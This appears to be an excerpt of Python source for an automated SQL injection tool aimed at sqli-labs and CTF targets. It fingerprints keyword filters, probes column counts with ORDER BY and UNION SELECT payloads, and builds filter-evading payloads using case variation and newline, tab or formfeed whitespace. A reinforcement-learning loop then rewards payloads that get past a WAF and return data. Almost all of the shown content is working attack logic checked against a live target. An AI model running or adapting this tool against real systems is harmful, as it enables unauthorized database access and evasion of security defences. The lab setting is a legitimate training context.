...
SUCCESS_INDICATORS = [
    ...
    "login name:", "password:",   # Less-27 echoes "Your Login name:" and "Your Password:"
]
WAF_INDICATORS = [
...
SQL_ERROR_INDICATORS = [
    ...
    # MySQL UNION column count mismatch — CRITICAL for column detection
    "different number of columns",
    "have a different number",
    # MySQL ORDER BY out-of-range — CRITICAL for ORDER BY column detection
    "unknown column",
    "out of range",
    ...
    if hint_match:
        ...
        if has_sql_err:
            if has_kw_union and has_kw_select:
                ...
                return "SQL_ERROR"
        elif has_kw_union and has_kw_select:
            # Keywords passed filter and no SQL error — possible success or UNKNOWN
            # Check for success indicators again more aggressively
            for ind in SUCCESS_INDICATORS:
                if ind in text:
                    return "SUCCESS"
            return "PARTIAL_BYPASS"  # keywords passed but didn't get data yet
...
class Fingerprinter:
    ...
    def _detect_filter_type(self):
        ...
        **Strategy**: sqli-labs (and many CTF targets) echo the filtered
        ...
        echo_probes = {
            # For each canary: (send_this, expected_echo_if_not_filtered, filter_name)
            # NOTE: These canaries deliberately test filtered keywords.
            # If the WAF blocks them (403), that also means the keyword is filtered.
            "union":   ("xUNIONx",  "xunionx",  "union"),
            "select":  ("xSELECTx", "xselectx", "select"),
            "space":   ("xAx",      "xax",       "space"),   # use a char not space; we test space separately below
            "comment": ("x/**/x",   "x/**/x",   "comment"),
            "dash":    ("x--x",     "x--x",     "dash_comment"),
            "hash":    ("x%23x",    "x%23x",    "dash_comment"),  # url-encoded # to avoid WAF on #
        }

        # Also test specific case variants that Less-27 strips
        case_variants = {
            "union_lower":  ("xunionx",  "xunionx",  "union"),
            "union_cap":    ("xUnionx",  "xunionx",  "union"),
            "select_lower": ("xselectx", "xselectx", "select"),
            "select_cap":   ("xSelectx", "xselectx", "select"),
        }

        # Send one combined probe to detect echo capability
        # CRITICAL: echo_test must NOT contain any filtered keywords (SELECT, UNION, spaces, /*, --, #)
        # because targets like Less-27 would block it with 403 before we see the echo!
        echo_test = "CANARYXYZ999"
        resp_echo, st_echo = send_request(self.target, echo_test)
        time.sleep(REQUEST_DELAY)
        has_echo = "canaryxyz999" in resp_echo.lower() and st_echo not in (403, 406)

        # Test for space filter separately using a safe non-space URL-encoded probe:
        # Send "xAx" and "x%20x" (URL-encoded space): if %20 gets decoded+filtered, response differs
        _space_test, _ = send_request(self.target, "xAx")
        _space_resp, _space_st = send_request(self.target, "xAAx")
        # Simpler: just test literal space via %20
        _sp_resp, _sp_st = send_request(self.target, "x%20x")
        time.sleep(REQUEST_DELAY)
        if _sp_st in (403, 406) or ("x x" not in _sp_resp.lower() and "x%20x" not in _sp_resp.lower()):
            filters_detected.add("space")

        if has_echo:
            self.log("Echo-based filter detection available")

            for name, (canary, survival_check, filter_name) in echo_probes.items():
                resp, st = send_request(self.target, canary)
                time.sleep(REQUEST_DELAY)
                resp_lower = resp.lower()

                # Filtered if: blocked (403) OR canary not echoed back
                is_filtered = (st in (403, 406)) or (survival_check.lower() not in resp_lower)
                if is_filtered:
                    filters_detected.add(filter_name)

            # Check case variants
            for name, (canary, survival_check, filter_name) in case_variants.items():
                resp, st = send_request(self.target, canary)
                time.sleep(REQUEST_DELAY)
                is_filtered = (st in (403, 406)) or (survival_check.lower() not in resp.lower())
                if is_filtered:
                    filters_detected.add(filter_name)

            # Test OR and AND keywords
            for kw, filter_name in [("OR", "or"), ("AND", "and")]:
                resp, st = send_request(self.target, f"x{kw}x")
                time.sleep(REQUEST_DELAY)
                is_filtered = (st in (403, 406)) or (f"x{kw.lower()}x" not in resp.lower())
                if is_filtered:
                    filters_detected.add(filter_name)
    ...
    def _detect_columns(self):
        ...
        # For space-filtering targets, apply newline/tab bypass.
        if not is_quote_close:
            def apply_orderby_bypass(raw):
                if ft in ("union_select_comments_spaces", "comments_spaces_or_and", "union_select_combined"):
                    # Try newline first, then tab
                    return raw.replace(" ", "%0a")
                return raw

            last_success_n = 0
            for n in range(1, 20):
                raw = f"1{q}{c} ORDER%0aBY%0a{n}{suffix}"  # always use %0a for ORDER BY
        ...
        # For union_select_* filters we MUST apply case+space bypass or every probe gets blocked.
        # We try two bypass combos: (case_variation + newline) and (case_variation + tab).
        if not is_quote_close:
            bypass_combos = [
                lambda p: MutationEngine.newline_space(MutationEngine.case_variation(p)),
                lambda p: MutationEngine.tab_space(MutationEngine.case_variation(p)),
                lambda p: MutationEngine.formfeed_space(MutationEngine.case_variation(p)),
                self._build_probe_payload,  # original fallback
            ]
            for n in range(1, 15):
                cols = ",".join(["NULL"] * n)
                raw = f"0{q}{c} UNION SELECT {cols}{suffix}"
                found = False
                for apply_bypass in bypass_combos:
                    payload = apply_bypass(raw)
                    resp, status = send_request(self.target, payload)
                    time.sleep(REQUEST_DELAY)
        ...
        # For union_select_* filters we MUST apply case+space bypass here too.
        if q:
            ...
            for n in range(1, 10):
                ...
                for apply_bypass in bypass_combos_qc:
                    payload = apply_bypass(raw)
                    resp, status = send_request(self.target, payload)
                    time.sleep(REQUEST_DELAY)
        ...
        self.log(f"WARNING: Column count detection inconclusive, defaulting to {self.target.columns}")
    ...
    def _detect_injectable_columns(self):
        ...
        def apply_col_bypass(raw_payload: str) -> str:
            """Apply appropriate bypass for injectable column detection."""
            if ft in ("union_select_comments_spaces", "union_select_combined"):
                return MutationEngine.newline_space(MutationEngine.case_variation(raw_payload))
            return self._build_probe_payload(raw_payload)
        ...
        payload2 = apply_col_bypass(raw2)
        resp2, _ = send_request(self.target, payload2)
        time.sleep(REQUEST_DELAY)
    ...
    def _build_base_payload(self):
        ...
        IMPORTANT: For filter types that strip UNION/SELECT/spaces,
        the base payload must be pre-encoded so it passes the WAF.
        The agent then mutates FROM this already-passing base to find
        further obfuscation if needed.
        ...
        if needs_quote_close and q:
            ...
            raw = f"0{q}{c} UNION SELECT {','.join(col_parts)}"
            self.target.suffix = "QUOTE_CLOSE"  # normalize
        else:
            raw = f"0{q}{c} UNION SELECT {cols}{suffix}"

        # Pre-apply minimum bypass so base_payload already passes the WAF.
        # For union_select_* filters: space+keyword bypass is mandatory.
        # We pick the lightest bypass that works, verified against the live target.
        # IMPORTANT: We store the RAW (unencoded) form as base_payload so that
        # space-replacement mutations have spaces to work with. The verified bypass
        # is stored in target.verified_bypass for the training loop to use.
        if ft in ("union_select_comments_spaces", "union_select_combined",
            ...
            for space_enc, union_kw, select_kw in bypass_candidates:
                candidate = raw.replace(" ", space_enc).replace("UNION", union_kw).replace("SELECT", select_kw)
                resp, st = send_request(self.target, candidate)
                time.sleep(REQUEST_DELAY)
                if st not in (403, 406) and "forbidden" not in resp.lower():
                    # SUCCESS right from the verified bypass?
                    resp_lower = resp.lower()
                    if any(ind in resp_lower for ind in SUCCESS_INDICATORS):
                        self.log(f"Base payload already achieves bypass+success! (status={st})")
                    else:
                        self.log(f"Base bypass verified (status={st}, space={space_enc}, union={union_kw})")
                    # Store RAW for mutations to work with, verified bypass in metadata
                    self.target.base_payload = raw  # keep spaces for agent to mutate
                    self.target.extra_params["_verified_bypass"] = candidate
                    self.target.extra_params["_bypass_space"] = space_enc
                    break
            else:
                self.log("WARNING: No bypass candidate verified, using raw payload")
                self.target.base_payload = raw
        else:
            self.target.base_payload = raw
...
REWARD_TABLE = {
    "SUCCESS":        10.0,
    "PARTIAL_BYPASS":  2.0,   # keywords survived filter but SQL errors (positive but not dominant)
...
def train(target: TargetProfile, episodes: int = MAX_EPISODES) -> List[dict]:
    ...
    for ep in range(episodes):
        ...
        step_log = []
        success = False
        waf_streak = 0  # consecutive WAF_BLOCKED count
        ...
        for step in range(MAX_STEPS):
            ...
            if result == "WAF_BLOCKED":
                # On WAF block: DON'T advance payload — try different mutation on current payload
                waf_streak += 1
                if waf_streak >= 3:
                    # Too many consecutive blocks — reset to base_payload and try fresh
                    payload = base_payload
                    waf_streak = 0
                    state = encode_state("INIT", "none", step + 1, payload)
                else:
                    state = next_state
                # Don't update payload to the blocked one
            elif result == "SUCCESS":
                payload = mutated
                state = next_state
                success = True
